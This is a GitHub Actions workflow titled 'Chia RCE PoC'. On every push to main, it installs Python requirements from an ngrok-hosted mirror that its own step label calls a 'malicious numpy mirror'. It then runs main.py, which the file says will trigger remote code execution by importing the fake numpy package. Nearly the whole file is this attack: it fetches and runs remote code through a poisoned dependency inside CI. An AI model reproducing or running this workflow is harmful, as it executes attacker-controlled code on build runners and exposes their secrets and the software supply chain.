name: 🔥 Chia RCE PoC

on:
  push:
    branches:
      - main
  workflow_dispatch:

jobs:
  rce_proof:
    name: 🚀 RCE via Fake NumPy
    runs-on: ubuntu-latest

    steps:
      - name: 📥 Checkout code
        uses: actions/checkout@v3

      - name: 🐍 Setup Python 3.10
        uses: actions/setup-python@v4
        with:
          python-version: '3.10'

      - name: 📦 Install requirements from malicious numpy mirror
        run: |
          echo "[*] Installing requirements from ngrok mirror..."
          pip install --find-links https://74cb59ca3c50.ngrok-free.app -r requirements.txt

      - name: 🔥 Trigger RCE by importing numpy
        run: |
          echo "[*] Running main.py to trigger RCE"
          python3 main.py

